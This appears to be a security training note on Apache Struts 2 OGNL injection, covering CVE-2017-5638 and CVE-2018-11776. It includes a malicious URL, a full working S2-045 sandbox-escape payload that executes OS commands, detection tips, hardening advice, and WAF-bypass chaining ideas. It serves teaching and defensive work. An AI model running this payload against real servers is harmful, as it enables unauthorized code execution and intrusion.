---
tags: [web, advanced, enterprise, deserialization, vapt]
difficulty: advanced
module: "80 - Enterprise Web Apps: WebLogic, ColdFusion, Liferay"
topic: "80.04 Apache Struts Remote Code Execution"
---

# Apache Struts Remote Code Execution

## 1. Introduction to Apache Struts

Apache Struts 2 is a historically dominant, open-source web application framework for developing Java EE web applications. It utilizes a Model-View-Controller (MVC) architecture to seamlessly integrate web frontend views (usually JSP or FreeMarker) with backend Java logic. Due to its early adoption in the early 2000s, it forms the backbone of countless legacy enterprise systems, government portals, and banking applications.

Despite its utility, Apache Struts 2 has gained immense notoriety in the cybersecurity world. It is arguably the framework most consistently plagued by catastrophic, unauthenticated Remote Code Execution (RCE) vulnerabilities. The primary culprit behind almost all of these vulnerabilities is the framework's reliance on **OGNL** (Object-Graph Navigation Language) for data binding and expression evaluation.

---

## 2. The Core Architecture and OGNL

To exploit Struts 2, one must understand how data flows from an HTTP request to the internal Java objects.

### 2.1 The ValueStack and Interceptors
When an HTTP request hits a Struts 2 application, it passes through a series of filters called **Interceptors**. These interceptors are responsible for handling file uploads, validating data, and binding HTTP parameters to Java objects. 
The **ValueStack** is a central storage area within Struts 2 that holds the application's data. Interceptors push data onto the ValueStack, and the View layer pulls data from it to render the webpage.

### 2.2 Object-Graph Navigation Language (OGNL)
OGNL is a powerful expression language used extensively within Struts 2 to get and set properties of Java objects residing on the ValueStack. It is designed to evaluate expressions heavily laden with reflection capabilities.
For example, if an HTTP request contains the parameter `user.name=Alice`, OGNL evaluates this by looking for the `user` object on the ValueStack and calling the `setName("Alice")` method.

**The Fatal Flaw:** OGNL is incredibly powerful. It does not just get and set properties; it can execute arbitrary Java methods, instantiate new objects, and access static classes. If user input is directly evaluated as an OGNL expression, an attacker can supply an expression that calls `java.lang.Runtime.getRuntime().exec()`.

---

## 3. Historic and Devastating Struts CVEs

### 3.1 CVE-2017-5638 (The Equifax Breach)
This is arguably the most famous Struts vulnerability. The flaw existed in the Jakarta Multipart parser, which handles file uploads. When an attacker sent an HTTP request with an invalid `Content-Type` header (e.g., instead of `multipart/form-data`), the parser threw an exception. Struts 2 then took the malicious user-provided `Content-Type` string and evaluated it using OGNL to generate a dynamic error message.
By placing an OGNL execution payload directly in the `Content-Type` header, attackers achieved pre-authentication RCE on millions of servers globally.

### 3.2 CVE-2018-11776 (Namespace RCE)
This vulnerability allowed RCE via namespace manipulation. If an application used the `alwaysSelectFullNamespace` configuration (which was often true) and didn't properly configure namespace routing, an attacker could inject OGNL expressions directly into the URL path.
Example malicious URL: `http://target.com/struts2-showcase/${(new java.lang.ProcessBuilder('id')).start()}/action`

### 3.3 The S2 Advisory Series
Struts vulnerabilities are typically labeled by their advisory number (e.g., S2-045 for CVE-2017-5638, S2-057 for CVE-2018-11776). Familiarity with the S2 naming convention is essential when looking up exploits.

---

## 4. Attack Flow: OGNL Injection Mechanics

Below is an ASCII diagram visualizing the evaluation flow of a malicious OGNL payload in Struts 2.

```text
+-----------------+                                  +------------------------------+
|                 |                                  |   Apache Struts 2 App        |
|   Attacker      |       1. HTTP Request            |   (Tomcat / Java Backend)    |
|                 | -------------------------------> |                              |
| [Payload in     | Content-Type: %{...OGNL...}      |  +------------------------+  |
|  Header/URL]    |                                  |  | Jakarta/Struts Parser  |  |
|                 |                                  |  | (Throws Exception)     |  |
|                 |                                  |  +------------------------+  |
|                 |                                  |              |               |
+-----------------+                                  |              v               |
         ^                                           |  +------------------------+  |
         |                                           |  | Error Handler / Interc |  |
         |            2. Shell Execution /           |  | Evaluates Error String |  |
         +-------------------------------------------|  | containing OGNL Payload|  |
                      Output Returned                |  +------------------------+  |
                      in HTTP Response               |              |               |
                                                     |              v               |
                                                     |  +------------------------+  |
                                                     |  | OGNL Engine            |  |
                                                     |  | executes Java Mathods  |  |
                                                     |  | java.lang.Runtime.exec |  |
                                                     |  +------------------------+  |
                                                     +------------------------------+
```

---

## 5. Exploitation Deep Dive and Payload Construction

### Bypassing OGNL Sandboxing
Over the years, Apache attempted to secure OGNL by implementing a `SecurityMemberAccess` class, which acted as a sandbox to prevent access to dangerous classes like `java.lang.Runtime`.
Consequently, modern Struts exploitation is a two-step process within a single payload:
1. **Escape the Sandbox:** The OGNL expression first modifies the `SecurityMemberAccess` rules in memory, essentially turning off the sandbox for the duration of the request.
2. **Execute Code:** With the sandbox disabled, the payload instantiates `ProcessBuilder` or `Runtime` to execute OS commands.

### Example OGNL Payload Breakdown (S2-045 / CVE-2017-5638)

```text
%{(#_='multipart/form-data').
  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
  (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).
    (#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).
  (#cmd='id').
  (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
  (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
  (#p=new java.lang.ProcessBuilder(#cmds)).
  (#p.redirectErrorStream(true)).
  (#process=#p.start()).
  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
  (#ros.flush())}
```

**What is happening here?**
1. Syntax starts with `%` or `$` to tell the Struts engine to evaluate the enclosed OGNL.
2. The payload clears the `ExcludedPackageNames` and `ExcludedClasses` blacklists.
3. It sets `_memberAccess` to default, bypassing reflection restrictions.
4. It detects the OS (Windows vs Linux).
5. It uses `java.lang.ProcessBuilder` to execute the command.
6. Crucially, it copies the output stream of the command back into the `ServletActionContext` HTTP response. This makes it an **inline, visible RCE**, unlike many blind deserialization bugs.

---

## 6. Detection and Fingerprinting

Fingerprinting a Struts application can be subtle, as developers often hide extensions.
- **Extensions:** Look for URLs ending in `.action` or `.do`.
- **Parameters:** Look for standard Struts parameters like `redirect:`, `redirectAction:`, or `action:`.
- **Headers:** Struts often sets specific session cookies (e.g., `JSESSIONID`) but behavior might change based on the error pages generated when invalid OGNL syntax is provided (e.g., submitting `%{"test"}` to a vulnerable parameter and seeing if it evaluates to `test`).

---

## 7. Defenses and Hardening

1. **Immediate Patching:** The only robust defense against Struts vulnerabilities is immediate upgrades. Because the root cause is deeply architectural (how OGNL is processed globally), point-fixes and workarounds frequently fail.
2. **Web Application Firewall (WAF):** WAFs are highly effective at detecting OGNL injection because the syntax (`%{#`, `ognl.OgnlContext`, `java.lang.ProcessBuilder`) is highly anomalous for standard web traffic. A strict WAF policy dropping requests with `%{` or `${` in headers and parameters mitigates a vast majority of automated scanning.
3. **Minimize Framework Capabilities:** If possible, disable dynamic method invocation (`struts.enable.DynamicMethodInvocation=false`) and strictly configure the Struts namespace configurations to avoid wildcards where possible.
4. **Network Egress Filtering:** Since attackers often use RCE to download secondary payloads, restricting outbound traffic from the web server layer significantly hampers post-exploitation activities.

---

## 8. Chaining Opportunities

- **Bypassing WAFs to hit Struts:** Since many WAFs block known OGNL payloads based on signature, attackers often chain HTTP Request Smuggling or HTTP Parameter Pollution to hide the payload from the WAF while delivering it perfectly to the backend Struts engine.
- **Internal SSRF to Struts:** External SSRF vulnerabilities can be leveraged to attack internal, highly-vulnerable legacy Struts portals that are not exposed to the internet. Because Struts RCE is often achievable via a single GET request (via URL namespace injection), SSRF is a perfect delivery vector.

---

## 9. Related Notes

- [[05 - Java Deserialization ysoserial Deep Dive]] - While Struts uses OGNL evaluation rather than traditional binary deserialization, both result in arbitrary Java reflection exploitation.
- [[01 - Oracle WebLogic Deserialization Vulnerabilities]] - Another prime example of enterprise Java environments failing to secure execution scopes.
- [[02 - Exploiting Adobe ColdFusion Server Vulnerabilities]] - Compares legacy CFML architectures with Struts MVC architectures in terms of their attack surfaces.
- [[03 - Liferay Portal Exploitation Techniques]] - Shows how complex Java frameworks manage configuration and the risks associated with dynamic object instantiation.
